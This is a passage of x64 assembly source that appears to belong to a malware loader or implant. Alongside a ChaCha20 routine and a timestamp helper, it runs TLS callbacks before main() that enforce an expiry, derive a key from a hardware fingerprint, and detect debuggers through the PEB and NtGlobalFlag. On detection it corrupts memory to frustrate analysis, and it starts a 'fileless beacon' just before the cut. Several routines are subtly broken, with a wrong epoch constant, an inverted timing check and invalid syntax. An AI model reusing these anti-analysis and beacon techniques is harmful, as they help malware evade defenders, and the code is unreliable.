    je @@print
    inc eax
    jmp @@len
    
@@print:
    mov r8d, eax
    mov rdx, rbx
    mov ecx, -11
    call GetStdHandle
    
    mov rcx, rax
    lea r9, [rsp+8]
    mov qword ptr [rsp+20h], 0
    call WriteConsoleA
    
    pop rbx
    ret
PrintDebug ENDP

GetUnixTimestamp PROC
    ; Returns: RAX = Unix timestamp (seconds since 1970)
    sub rsp, 16                 ; FILETIME structure (8 bytes, but align)
    
    mov rcx, rsp
    call GetSystemTimeAsFileTime
    
    ; Convert FILETIME (100-nanosecond intervals since 1601) to Unix
    mov rax, [rsp]              ; Low 64-bits of FILETIME
    mov rdx, 0x2B610911400      ; 116444736000000000 (100-nanosecond ticks)
    
    ; Divide by 10000000 to get seconds
    mov rcx, TICKS_PER_SECOND
    xor edx, edx
    div rcx
    
    ; Subtract epoch difference
    mov rcx, FILETIME_TO_UNIX
    sub rax, rcx
    
    add rsp, 16
    ret
GetUnixTimestamp ENDP

SecureCompareMemory PROC
    ; RCX = buf1, RDX = buf2, R8 = length
    ; Returns: ZF set if equal
    push rbx
    push r12
    push r13
    
    mov r12, rcx
    mov r13, rdx
    mov rbx, r8
    
    xor eax, eax                ; Result accumulator (0 = equal)
    
@@loop:
    cmp rbx, 0
    je @@done
    
    mov cl, [r12]
    xor cl, [r13]
    or al, cl                   ; Accumulate differences
    
    inc r12
    inc r13
    dec rbx
    jmp @@loop
    
@@done:
    test al, al                 ; Set ZF if all bytes matched
    pop r13
    pop r12
    pop rbx
    ret
SecureCompareMemory ENDP

; =============================================================================
; CHACHA20 STREAM CIPHER (For TLS context encryption)
; =============================================================================

ChaChaQuarterRound MACRO a, b, c, d
    add a, b
    xor d, a
    rol d, 16
    
    add c, d
    xor b, c
    rol b, 12
    
    add a, b
    xor d, a
    rol d, 8
    
    add c, d
    xor b, c
    rol b, 7
ENDM

ChaChaBlock PROC
    ; RCX = state (16 dwords), RDX = output (16 dwords)
    push rbx
    push r12
    push r13
    push r14
    push r15
    
    mov r12, rcx                ; Input state
    mov r13, rdx                ; Output
    
    sub rsp, 64                 ; Working state
    
    ; Copy state to stack
    mov rsi, r12
    mov rdi, rsp
    mov rcx, 16
    rep movsd
    
    ; 20 rounds (10 double rounds)
    mov r14d, 10
    
@@round_loop:
    ; Column round
    mov r8d, [rsp+0]
    mov r9d, [rsp+4]
    mov r10d, [rsp+8]
    mov r11d, [rsp+12]
    ChaChaQuarterRound r8d, r9d, r10d, r11d
    mov [rsp+0], r8d
    mov [rsp+4], r9d
    mov [rsp+8], r10d
    mov [rsp+12], r11d
    
    mov r8d, [rsp+16]
    mov r9d, [rsp+20]
    mov r10d, [rsp+24]
    mov r11d, [rsp+28]
    ChaChaQuarterRound r8d, r9d, r10d, r11d
    mov [rsp+16], r8d
    mov [rsp+20], r9d
    mov [rsp+24], r10d
    mov [rsp+28], r11d
    
    mov r8d, [rsp+32]
    mov r9d, [rsp+36]
    mov r10d, [rsp+40]
    mov r11d, [rsp+44]
    ChaChaQuarterRound r8d, r9d, r10d, r11d
    mov [rsp+32], r8d
    mov [rsp+36], r9d
    mov [rsp+40], r10d
    mov [rsp+44], r11d
    
    mov r8d, [rsp+48]
    mov r9d, [rsp+52]
    mov r10d, [rsp+56]
    mov r11d, [rsp+60]
    ChaChaQuarterRound r8d, r9d, r10d, r11d
    mov [rsp+48], r8d
    mov [rsp+52], r9d
    mov [rsp+56], r10d
    mov [rsp+60], r11d
    
    ; Diagonal round
    mov r8d, [rsp+0]
    mov r9d, [rsp+20]
    mov r10d, [rsp+40]
    mov r11d, [rsp+60]
    ChaChaQuarterRound r8d, r9d, r10d, r11d
    mov [rsp+0], r8d
    mov [rsp+20], r9d
    mov [rsp+40], r10d
    mov [rsp+60], r11d
    
    mov r8d, [rsp+4]
    mov r9d, [rsp+24]
    mov r10d, [rsp+44]
    mov r11d, [rsp+48]
    ChaChaQuarterRound r8d, r9d, r10d, r11d
    mov [rsp+4], r8d
    mov [rsp+24], r9d
    mov [rsp+44], r10d
    mov [rsp+48], r11d
    
    mov r8d, [rsp+8]
    mov r9d, [rsp+28]
    mov r10d, [rsp+32]
    mov r11d, [rsp+52]
    ChaChaQuarterRound r8d, r9d, r10d, r11d
    mov [rsp+8], r8d
    mov [rsp+28], r9d
    mov [rsp+32], r10d
    mov [rsp+52], r11d
    
    mov r8d, [rsp+12]
    mov r9d, [rsp+16]
    mov r10d, [rsp+36]
    mov r11d, [rsp+56]
    ChaChaQuarterRound r8d, r9d, r10d, r11d
    mov [rsp+12], r8d
    mov [rsp+16], r9d
    mov [rsp+36], r10d
    mov [rsp+56], r11d
    
    dec r14d
    jnz @@round_loop
    
    ; Add original state
    mov rsi, r12
    mov rdi, rsp
    mov ecx, 16
@@add_loop:
    lodsd
    add [rdi], eax
    add rdi, 4
    dec ecx
    jnz @@add_loop
    
    ; Copy to output
    mov rsi, rsp
    mov rdi, r13
    mov ecx, 16
    rep movsd
    
    add rsp, 64
    pop r15
    pop r14
    pop r13
    pop r12
    pop rbx
    ret
ChaChaBlock ENDP

; =============================================================================
; TLS VALIDATION CALLBACKS
; =============================================================================

TLS_ValidationCallback PROC
    ; This runs BEFORE main() - perfect for validation
    push rbx
    push r12
    push r13
    
    lea rcx, [szTLSInitialized]
    call PrintDebug
    
    ; Initialize context if first run
    cmp [g_TlsContext.Magic], TLS_MAGIC
    je @@check_validity
    
    ; First initialization
    mov [g_TlsContext.Magic], TLS_MAGIC
    mov [g_TlsContext.Version], TLS_VERSION
    
    ; Set validation period (default 1 year, configurable up to 10)
    mov [g_TlsContext.ValidationYears], 1
    
    call GetUnixTimestamp
    mov [g_TlsContext.InstallTimestamp], rax
    
    ; Calculate expiry: now + (years * 365 * 24 * 60 * 60)
    mov rbx, 365 * 24 * 60 * 60     ; Seconds per year
    mov ecx, [g_TlsContext.ValidationYears]
    imul rbx, rcx
    add rax, rbx
    mov [g_TlsContext.ExpiryTimestamp], rax
    
    ; Generate decryption key from hardware fingerprint
    call GenerateHardwareKey
    
    mov [g_TlsContext.ValidationStatus], 0
    
@@check_validity:
    ; Check current time against expiry
    call GetUnixTimestamp
    mov r12, rax                    ; Current time
    
    cmp rax, [g_TlsContext.ExpiryTimestamp]
    ja @@expired
    
    ; Check integrity (anti-tamper)
    call VerifyIntegrity
    test eax, eax
    jz @@tampered
    
    ; Valid - update last check
    mov [g_TlsContext.LastCheckTimestamp], r12d
    
    lea rcx, [szTLSValid]
    call PrintDebug
    
    ; Print expiry date (simplified)
    mov rax, [g_TlsContext.ExpiryTimestamp]
    ; ... (would convert to string here)
    
    mov eax, 1                      ; Continue execution
    jmp @@done
    
@@expired:
    mov [g_TlsContext.ValidationStatus], 1
    lea rcx, [szTLSExpired]
    call PrintDebug
    
    ; Anti-debug: Sleep to frustrate analysis
    mov ecx, 5000                   ; 5 seconds
    call Sleep
    
    xor eax, eax                    ; Block execution
    jmp @@done
    
@@tampered:
    mov [g_TlsContext.ValidationStatus], 2
    lea rcx, [szTLSTampered]
    call PrintDebug
    
    ; Corrupt memory to prevent analysis
    call CorruptAnalysis
    
    xor eax, eax
    
@@done:
    pop r13
    pop r12
    pop rbx
    ret
TLS_ValidationCallback ENDP

TLS_AntiDebugCallback PROC
    ; Check for debugger before main()
    push rbx
    
    ; Check PEB.BeingDebugged
    mov rax, gs:[60h]               ; PEB
    cmp byte ptr [rax+2], 0         ; BeingDebugged
    jne @@debugger_detected
    
    ; Check heap flags (NtGlobalFlag)
    mov eax, [rax+BC]               ; NtGlobalFlag offset
    and eax, 70h                    ; FLG_HEAP_ENABLE_TAIL_CHECK | FLG_HEAP_ENABLE_FREE_CHECK | FLG_HEAP_VALIDATE_PARAMETERS
    jnz @@debugger_detected
    
    ; Timing check
    call GetTickCount64
    mov rbx, rax
    
    ; ... (would insert delay here)
    
    call GetTickCount64
    sub rax, rbx
    cmp rax, 100                    ; If less than 100ms, probably debugged
    jb @@debugger_detected
    
    mov eax, 1
    jmp @@done
    
@@debugger_detected:
    ; Self-destruct or misdirect
    call CorruptAnalysis
    xor eax, eax
    
@@done:
    pop rbx
    ret
TLS_AntiDebugCallback ENDP

TLS_BeaconInitialize PROC
    ; Initialize fileless beacon if configured
    push rbx
    
